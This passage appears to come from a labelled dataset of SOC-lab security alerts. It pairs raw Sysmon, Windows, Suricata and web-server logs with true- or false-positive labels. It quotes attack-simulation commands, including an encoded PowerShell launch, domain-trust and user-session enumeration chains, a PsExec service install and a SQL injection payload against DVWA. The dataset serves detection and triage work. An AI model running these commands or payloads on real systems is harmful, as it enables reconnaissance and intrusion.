UtcTime: 2025-07-04 21:50:32.712
ProcessGuid: {ff3427f9-4ca8-6868-4606-000000001400}
ProcessId: 8368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.3323 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe  iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile C:\Users\snell\AppData\Local\Temp\Atomic-license.txt
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
ParentProcessGuid: {ff3427f9-4ca8-6868-4406-000000001400}
ParentProcessId: 3544
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\Atomic-license.txt
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Windows command prompt started by an abnormal process 4 Low Windows command prompt started by an abnormal process 92052 sysmon sysmon_eid1_detections windows windows_eventchannel WinSrv2019 C:\\Windows\\system32\\cmd.exe /d /c C:\\Windows\\system32\\silcollector.cmd configure C:\\Windows\\system32\\svchost.exe -k netsvcs -p C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\svchost.exe NT AUTHORITY\\SYSTEM ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-03 08:07:35.447
ProcessGuid: {6a97c67b-3a47-6866-c300-000000000a00}
ProcessId: 3560
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17763.1697 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: C:\Windows\system32\cmd.exe /d /c C:\Windows\system32\silcollector.cmd configure
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6a97c67b-3a07-6866-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=DED8FD7F36417F66EB6ADA10E0C0D7C0022986E9,MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {6a97c67b-3a0a-6866-1900-000000000a00}
ParentProcessId: 1244
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p
ParentUser: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process 6 Low Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process 92218 sysmon sysmon_eid11_detections windows windows_eventchannel Win11Client System C:\\Windows\\UbntCfHC.exe NT AUTHORITY\\SYSTEM ""File created:
RuleName: -
UtcTime: 2025-07-06 12:18:13.254
ProcessGuid: {ff3427f9-51d0-686a-eb03-000000000000}
ProcessId: 4
Image: System
TargetFilename: C:\Windows\UbntCfHC.exe
CreationUtcTime: 2025-07-06 12:18:13.254
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Executable dropped in Windows root folder 6 Low Executable dropped in Windows root folder 92217 sysmon sysmon_eid11_detections windows windows_eventchannel Win11Client C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Temp\\261c-0\\Microsoft.Security.ApplicationId.Wizards.AutomaticRuleGenerationWizard.dll NT AUTHORITY\\SYSTEM ""File created:
RuleName: technique_id=T1047,technique_name=File System Permissions Weakness
UtcTime: 2025-06-29 12:17:31.915
ProcessGuid: {ff3427f9-2edb-6861-3803-000000001000}
ProcessId: 9756
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
TargetFilename: C:\Windows\assembly\NativeImages_v4.0.30319_64\Temp\261c-0\Microsoft.Security.ApplicationId.Wizards.AutomaticRuleGenerationWizard.dll
CreationUtcTime: 2025-06-29 12:17:31.915
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client powershell.exe  -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA== \""cmd.exe\"" /c powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA== C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 20:24:42.384
ProcessGuid: {ff3427f9-388a-6868-1903-000000001400}
ProcessId: 4576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.3323 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe  -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
ParentProcessGuid: {ff3427f9-388a-6868-1703-000000001400}
ParentProcessId: 8636
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Windows command prompt started by an abnormal process 4 Low Windows command prompt started by an abnormal process 92052 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""cmd.exe\"" /c nltest /domain_trusts &amp; nltest /trusted_domains \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-06 10:52:41.526
ProcessGuid: {ff3427f9-5579-686a-8301-000000001600}
ProcessId: 7804
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c nltest /domain_trusts & nltest /trusted_domains
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-54be-686a-f173-470000000000}
LogonId: 0x4773F1
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-554a-686a-6001-000000001600}
ParentProcessId: 4180
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
Successful sudo to ROOT executed. 3 Low Successful sudo to ROOT executed. 5402 syslog sudo sudo wazuh-server Jul 04 18:54:41 wazuh-server sudo[4803]: wazuh-user : TTY=pts/0 ; PWD=/home/wazuh-user ; USER=root ; COMMAND=/usr/bin/su journald,0,FP
"Powershell script used ""Invoke-command"" cmdlet to execute sub script 12 High Powershell script used ""Invoke-command"" cmdlet to execute sub script 91822 windows  powershell windows_eventchannel Win11Client ""Creating Scriptblock text (1 of 1):
function Invoke-ExecuteCommand ($finalCommand, $executor, $executionPlatform, $TimeoutSeconds, $session = $null, $interactive) {
    $null = @(
        if ($null -eq $finalCommand) { return 0 }
        $finalCommand = $finalCommand.trim()
        Write-Verbose -Message 'Invoking Atomic Tests using defined executor'
        if ($executor -eq ""command_prompt"" -or $executor -eq ""sh"" -or $executor -eq ""bash"") {
            $execPrefix = ""-c""
            $execExe = $executor
            if ($executor -eq ""command_prompt"") {
                $execPrefix = ""/c"";
                $execExe = ""cmd.exe"";
                $execCommand = $finalCommand -replace ""`n"", "" & ""
                $arguments = $execPrefix, ""$execCommand""
            }
            else {
                $finalCommand = $finalCommand -replace ""[\\](?!;)"", ""`\$&""
                $finalCommand = $finalCommand -replace ""[`""]"", ""`\$&""
                $execCommand = $finalCommand -replace ""(?<!;)\n"", ""; ""
                $arguments = ""$execPrefix `""$execCommand`""""

            }
        }
        elseif ($executor -eq ""powershell"") {
            $execCommand = $finalCommand -replace ""`"""", ""`\`""`""""
            if ($session) {
                if ($executionPlatform -eq ""windows"") {
                    $execExe = ""powershell.exe""
                }
                else {
                    $execExe = ""pwsh""
                }
            }
            else {
                $execExe = ""powershell.exe""; if ($IsLinux -or $IsMacOS) { $execExe = ""pwsh"" }
            }
            if ($execExe -eq ""pwsh"") {
                $arguments = ""-Command $execCommand""
            }
            else {
                $arguments = ""& {$execCommand}""
            }
        }
        else {
            Write-Warning -Message ""Unable to generate or execute the command line properly. Unknown executor""
            return [PSCustomObject]@{
                StandardOutput = """"
                ErrorOutput    = """"
                ExitCode       = -1
                IsTimeOut      = $false
            }
        }

        # Write-Host -ForegroundColor Magenta ""$execExe $arguments""
        if ($session) {
            $scriptParentPath = Split-Path $import -Parent
            $publicPath = Join-Path (Split-Path $scriptParentPath -Parent) ""Public""
            $fp = Join-Path $scriptParentPath ""Invoke-Process.ps1""
            $fp2 = Join-Path $publicPath ""Invoke-KillProcessTree.ps1""
            invoke-command -Session $session -FilePath $fp
            invoke-command -Session $session -FilePath $fp2
            $res = invoke-command -Session $session -ScriptBlock { Invoke-Process -filename $Using:execExe -Arguments $Using:arguments -TimeoutSeconds $Using:TimeoutSeconds -stdoutFile ""art-out.txt"" -stderrFile ""art-err.txt"" }
        }
        else {
            if ($interactive) {
                # This use case is: Local execution of tests that contain interactive prompts
                #   In this situation, let the stdout/stderr flow to the console
                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds
            }
            else {
                # Local execution that DO NOT contain interactive prompts
                #   In this situation, capture the stdout/stderr for Invoke-AtomicTest to send to the caller
                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds -stdoutFile ""art-out.txt"" -stderrFile ""art-err.txt""
            }
        }
    )
    $res
}


ScriptBlock ID: 1e36dd25-eac3-4ad6-8657-b58ed5423be7
Path: C:\AtomicRedTeam\invoke-atomicredteam\Private\Invoke-ExecuteCommand.ps1"" VERBOSE Microsoft-Windows-PowerShell Microsoft-Windows-PowerShell/Operational EventChannel",1,TP
"Executable file dropped in folder commonly used by malware 15 Critical Executable file dropped in folder commonly used by malware 92213 sysmon sysmon_eid11_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\system32\\wsmprovhost.exe C:\\Users\\vboxuser.SOCLAB\\AppData\\Local\\Temp\\__PSScriptPolicyTest_bjz4zpu1.1mi.ps1 SOCLAB\\vboxuser ""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2025-07-04 10:01:44.173
ProcessGuid: {ff3427f9-a687-6867-1b07-000000001200}
ProcessId: 5228
Image: C:\WINDOWS\system32\wsmprovhost.exe
TargetFilename: C:\Users\vboxuser.SOCLAB\AppData\Local\Temp\__PSScriptPolicyTest_bjz4zpu1.1mi.ps1
CreationUtcTime: 2025-07-04 10:01:44.173
User: SOCLAB\vboxuser"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares. 12 High New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares. 92650 win_evt_channel windows windows_eventchannel Win11Client ""A service was installed in the system.

Service Name:  PSEXESVC
Service File Name:  %SystemRoot%\PSEXESVC.exe
Service Type:  user mode service
Service Start Type:  demand start
Service Account:  LocalSystem"" INFORMATION Service Control Manager System EventChannel",1,TP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client cmd.exe  /C whoami \""cmd.exe\"" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\""localhost\"" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \""tokens=1,2\"" %i in ('qwinsta /server:localhost ^| findstr \""Active Disc\""') do @echo %i | find /v \""#\"" | find /v \""console\"" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \""tokens=1,2\"" %i in ('qwinsta /server:%n ^| findstr \""Active Disc\""') do @echo %i | find /v \""#\"" | find /v \""console\"" || echo %j &gt; usernames.txt C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-05 13:02:35.232
ProcessGuid: {ff3427f9-226b-6869-9101-000000001500}
ProcessId: 8076
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe  /C whoami 
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}
LogonId: 0x82F6F
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}
ParentProcessId: 9176
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:""localhost"" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F ""tokens=1,2"" %i in ('qwinsta /server:localhost ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
Suricata: Alert - POSSBL PORT SCAN (NMAP -sS) 3 Low Suricata: Alert - POSSBL PORT SCAN (NMAP -sS) 86601 ids suricata json Suricata /var/log/suricata/eve.json,1,TP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client find  /v \""#\"" \""cmd.exe\"" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\""localhost\"" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \""tokens=1,2\"" %i in ('qwinsta /server:localhost ^| findstr \""Active Disc\""') do @echo %i | find /v \""#\"" | find /v \""console\"" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \""tokens=1,2\"" %i in ('qwinsta /server:%n ^| findstr \""Active Disc\""') do @echo %i | find /v \""#\"" | find /v \""console\"" || echo %j &gt; usernames.txt C:\\Windows\\System32\\find.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-05 13:02:57.748
ProcessGuid: {ff3427f9-2281-6869-9c01-000000001500}
ProcessId: 7320
Image: C:\Windows\System32\find.exe
FileVersion: 10.0.26100.1 (WinBuild.160101.0800)
Description: Find String (grep) Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: FIND.EXE
CommandLine: find  /v ""#"" 
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}
LogonId: 0x82F6F
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=92ADFE3440739BFB92E9866D2ED050E5D20BE198,MD5=21AF9D1389428FB7DE154C11ADCAC954,SHA256=CF9CC5A552DE280750B36743E80C33381E59D5EC8AA65A2DCFDD6A34198799BC,IMPHASH=7EF15CE1238ABC9D0468CB4D7C10B6F3
ParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}
ParentProcessId: 9176
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:""localhost"" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F ""tokens=1,2"" %i in ('qwinsta /server:localhost ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Windows User Logoff 3 Low Windows User Logoff 60137 windows windows_security windows_eventchannel WinSrv2019 ""An account was logged off.

Subject:
	Security ID:		S-1-5-21-3023907177-3273552708-540821291-1107
	Account Name:		snell
	Account Domain:		SOCLAB
	Logon ID:		0x9E5194

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer."" AUDIT_SUCCESS Microsoft-Windows-Security-Auditing Security EventChannel",0,FP
"SQL injection attempt. 6 Low SQL injection attempt. 31164 web accesslog attack sqlinjection attack web-accesslog Linux-Server 10.0.2.14 - - [04/Jul/2025:21:23:07 +0000] ""GET /DVWA/vulnerabilities/sqli/?id=%27+or+1%3D1%23&Submit=Submit&user_token=d4eb64c9b84265fa1a696e43b957a44c HTTP/1.1"" 200 1842 ""http://10.0.2.9/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit&user_token=b922d45d08bcb54463ee09c63d492669"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"" /var/log/apache2/access.log",1,TP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client hostname cmd.exe  /Q /c hostname C:\\Windows\\System32\\HOSTNAME.EXE C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
